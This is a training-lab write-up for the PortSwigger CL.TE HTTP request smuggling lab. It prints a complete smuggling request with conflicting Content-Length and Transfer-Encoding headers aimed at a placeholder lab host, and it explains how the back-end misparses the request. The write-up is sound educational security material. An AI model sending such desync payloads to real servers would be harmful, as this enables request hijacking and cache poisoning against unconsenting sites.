# Lab 01 — HTTP request smuggling, basic CL.TE vulnerability

> **Practitioner** · [Official lab](https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te)

**Entry point:** raw request crafted in Burp Repeater · **Vulnerability:**
front-end uses `Content-Length`, back-end uses `Transfer-Encoding` (CL.TE).

## Solution

1. In Repeater, disable "Update Content-Length" and send exactly this
   (two full requests in one):

```http
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

0

G
```

2. The front-end forwards `Content-Length: 6` bytes (`0\r\n\r\nG`); the
   back-end reads chunked encoding, ends the request at `0`, and treats the
   `G` as the start of the **next** request → `GPOST /` → 400 "Invalid
   method" — proving the smuggling — lab solved.

## Notes

Send each request **once** (connection reuse contaminates results), and use
`Connection: keep-alive`.
